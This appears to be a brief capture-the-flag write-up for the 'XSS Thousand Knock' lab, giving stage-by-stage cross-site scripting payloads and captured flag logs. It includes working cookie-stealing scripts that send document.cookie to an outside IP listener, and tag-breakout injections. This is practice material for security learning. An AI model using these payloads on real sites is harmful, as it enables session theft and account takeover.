# XSS_Thousand_Knock_Write_up

# Stage 1 (Tutorial)- Set up VPS/VPN, I used my AWS Shadowsock VPN in this case, and I created a python to listen flag coming through my VPN server
	- Example: *http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://example.com/?%22%2Bdocument.cookie*

	----> location="http://example.com/?"+document.cookie
	- <script>location=%22http://54.250.29.21:5000/?%22%2Bdocument.cookie</script>

	- 133.130.88.37 - - [23/Apr/2018 21:13:08] "GET /?flag=FLAG{waiwai_xss} HTTP/1.1" 200 - Flag is:FLAG{c1a43cdd6c2d3d4a082fe9351bce65f5917ca940}
# Stage 2
  -	http://1a31198b4289ff3af4f7195a810c48eba9f6bf28.knock.xss.moe/?q=%22%3E%3Cscript%3Elocation=%22http://YOUR VPN:5000/?%22%2Bdocument.cookie%3C/script%3E
	133.130.88.37 - - [23/Apr/2018 21:37:28] "GET /?flag=FLAG{c1a43cdd6c2d3d4a082fe9351bce65f5917ca940} HTTP/1.1" 200 -

# Stage 3
	Same as Stage 2
  - 133.130.88.37 - - [23/Apr/2018 22:05:37] "GET /?flag=FLAG{0041c8c9789deee9280396eb923d5b4ea8e887b2} HTTP/1.1" 200 -
# Stage 4
	- you need to bypass the <a> by </a> first, then implement XSS attack
	e1f80fe2ec262a235d594fbcee96dba66710.knock.xss.moe/?q='</a>"><script>alert(3)</script>
133.130.88.37 - - [23/Apr/2018 22:11:58] "GET /?flag=FLAG{b8ab462f4ee4aa10f1f0eadb16383f1a596f3ec2} HTTP/1.1" 200 -

# Stage 5
	Similar as Stage 4, you need to bypass textarea in this time
	133.130.88.37 - - [23/Apr/2018 22:17:54] "GET /?flag=FLAG{57a968be0c6c0ba1dbc8a222488358366fda4edf} HTTP/1.1" 200 -

# Stage 6
 	Similar, but you need to bypass XMP tag
	133.130.88.37 - - [23/Apr/2018 22:20:40] "GET /?flag=FLAG{66cd945a9de10077c24fc13b0834eec04a16df0c} HTTP/1.1" 200 -
